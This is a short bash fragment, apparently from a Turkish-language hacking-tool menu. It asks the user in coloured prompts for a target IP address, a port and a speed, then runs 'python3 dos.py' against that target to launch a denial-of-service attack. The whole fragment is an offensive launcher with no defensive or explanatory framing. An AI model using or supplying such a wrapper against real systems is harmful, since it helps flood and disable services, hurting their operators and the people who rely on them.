read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m İp adresi : ' dos_ip
                echo -e ""
                read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m Port Numarası [80 , 21 , 22] : ' dos_port
                echo -e ""
                read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m Hız [80 , 21 , 22] : ' hiz
                python3 dos.py -s $dos_ip -p $dos_port -t $hiz
